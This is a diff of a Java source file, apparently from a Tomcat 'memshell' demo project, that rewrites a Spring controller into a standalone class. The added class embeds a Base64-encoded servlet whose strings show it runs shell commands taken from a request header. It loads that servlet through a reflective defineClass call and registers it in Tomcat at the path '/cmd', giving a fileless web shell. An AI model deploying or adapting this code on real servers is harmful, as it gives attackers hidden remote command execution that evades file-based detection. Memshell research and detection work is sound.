@@ -1,51 +1,32 @@
-package com.example.tomcatmemshell.demos.web.addservlet;
+package com.example.tomcatmemshell.demos.web.spel;
 
-import com.example.tomcatmemshell.utils.DynamicUtils;
 import org.apache.catalina.Context;
 import org.apache.catalina.WebResourceRoot;
 import org.apache.catalina.Wrapper;
 import org.apache.catalina.connector.Connector;
 import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.core.StandardService;
-import org.apache.catalina.loader.WebappClassLoader;
-import org.apache.catalina.loader.WebappClassLoaderBase;
 import org.apache.coyote.AbstractProtocol;
 import org.apache.coyote.ProtocolHandler;
 import org.apache.coyote.RequestGroupInfo;
 import org.apache.coyote.RequestInfo;
-import org.apache.tomcat.util.descriptor.web.FilterDef;
-import org.apache.tomcat.util.descriptor.web.FilterMap;
 import org.apache.tomcat.util.net.AbstractEndpoint;
 import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;
-import org.springframework.stereotype.Controller;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.ResponseBody;
 
-import javax.servlet.DispatcherType;
-import javax.servlet.Filter;
-import javax.servlet.Servlet;
-import javax.servlet.ServletContext;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import java.lang.reflect.Constructor;
+import javax.servlet.*;
 import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
-import java.util.HashMap;
-
-import static com.example.tomcatmemshell.utils.DynamicUtils.FILTER_CLASS_STRING;
-import static com.example.tomcatmemshell.utils.DynamicUtils.SERVLET_CLASS_STRING;
+import java.util.Base64;
 
 
-@Controller
-public class AddServletController {
 
+public class AddServlet2 {
 
-    @RequestMapping("/addservlet")
-    @ResponseBody
-    public String addservlet(HttpServletRequest req, HttpServletResponse resp) {
+    public static String SERVLET_CLASS_STRING = "yv66vgAAADcAbgoAEgBABwBBCAAxCwACAEIKAEMARAoAQwBFCgA2AEYHAEcHAEgKAAkASQoACABKCgAIAEsLADQATAoATQBOCgA2AE8HAFAHAFEHAFIHAFMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAQUxjb20vZXhhbXBsZS90b21jYXRtZW1zaGVsbC9kZW1vcy93ZWIvYWRkc2VydmxldC9NZW1zaGVsbFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAQZ2V0U2VydmxldENvbmZpZwEAHygpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzsBAAdzZXJ2aWNlAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAVAcAVQcAVgcAVwcAWAEACkV4Y2VwdGlvbnMHAFkHAFoBAA5nZXRTZXJ2bGV0SW5mbwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABRNZW1zaGVsbFNlcnZsZXQuamF2YQwAFAAVAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAWwBcBwBdDABeAF8MAGAAYQwAYgBjAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMABQAZAwAFABlDABmADwMAGcAaAcAaQwAagBrDABsAG0BAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BAD9jb20vZXhhbXBsZS90b21jYXRtZW1zaGVsbC9kZW1vcy93ZWIvYWRkc2VydmxldC9NZW1zaGVsbFNlcnZsZXQBABBqYXZhL2xhbmcvT2JqZWN0AQAVamF2YXgvc2VydmxldC9TZXJ2bGV0AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB3dhaXRGb3IBAAMoKUkAIQARABIAAQATAAAABgABABQAFQABABYAAAAvAAEAAQAAAAUqtwABsQAAAAIAFwAAAAYAAQAAAA8AGAAAAAwAAQAAAAUAGQAaAAAAAQAbABwAAQAWAAAANQAAAAIAAAABsQAAAAIAFwAAAAYAAQAAABEAGAAAABYAAgAAAAEAGQAaAAAAAAABAB0AHgABAAEAHwAgAAEAFgAAACwAAQABAAAAAgGwAAAAAgAXAAAABgABAAAAFAAYAAAADAABAAAAAgAZABoAAAABACEAIgACABYAAAFRAAUACgAAAFwrwAACTi0SA7kABAIAOgQZBMYASrgABRkEtgAGOgUZBbYABzoGuwAIWbsACVkZBrcACrcACzoHGQe2AAxZOgjGABEsuQANAQAZCLYADqf/6hkFtgAPV6cABToJsQABAFAAVgBZABAAAwAXAAAAMgAMAAAAGAAFABkADwAaABQAGwAeABwAJQAdADcAHwBCACAAUAAjAFYAJgBZACQAWwAoABgAAABcAAkAHgA9ACMAJAAFACUANgAlACYABgA3ACQAJwAoAAcAPwAcACkAKgAIAAAAXAAZABoAAAAAAFwAKwAsAAEAAABcAC0ALgACAAUAVwAvADAAAwAPAE0AMQAqAAQAMgAAAEEABP8ANwAIBwARBwAzBwA0BwACBwA1BwA2BwA3BwAIAAD8ABgHADVIBwAQ/wABAAUHABEHADMHADQHAAIHADUAAAA4AAAABgACADkAOgABADsAPAABABYAAAAsAAEAAQAAAAIBsAAAAAIAFwAAAAYAAQAAACsAGAAAAAwAAQAAAAIAGQAaAAAAAQA9ABUAAQAWAAAAKwAAAAEAAAABsQAAAAIAFwAAAAYAAQAAAC8AGAAAAAwAAQAAAAEAGQAaAAAAAQA+AAAAAgA/";
+    public AddServlet2(){
         try {
 
             // 从线程中获取类加载器WebappClassLoaderBase
@@ -110,7 +91,7 @@ public class AddServletController {
                                 }
 
                                 // 创建自定义 Servlet
-                                Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);
+                                Class<?> servletClass = getClass(SERVLET_CLASS_STRING);
 
                                 // 使用 Wrapper 封装 Servlet
                                 Wrapper wrapper = o.createWrapper();
@@ -125,12 +106,7 @@ public class AddServletController {
                                 // 添加 servletMappings
                                 o.addServletMappingDecoded("/cmd", servletName);
 
-                                return "tomcat servlet added";
-                            }else{
-                                return "tomcat servlet already added";
                             }
-
-
                         }
                     }
                 }
@@ -140,7 +116,6 @@ public class AddServletController {
         } catch (Exception e) {
             e.printStackTrace();
         }
-        return "tomcat servlet add failed";
     }
 
     public static Object getField(Object obj, Field field){
@@ -151,5 +126,28 @@ public class AddServletController {
 
         }
         return null;
+    }
+
+    public static Class<?> getClass(String classCode) throws InvocationTargetException, IllegalAccessException {
+        ClassLoader   loader        = Thread.currentThread().getContextClassLoader();
+        byte[]        bytes         = Base64.getDecoder().decode(classCode);
+
+        Method   method = null;
+        Class<?> clz    = loader.getClass();
+        while (method == null && clz != Object.class) {
+            try {
+                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            } catch (NoSuchMethodException ex) {
+                clz = clz.getSuperclass();
+            }
+        }
+
+        if (method != null) {
+            method.setAccessible(true);
+            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
+        }
+
+        return null;
+
     }
 }
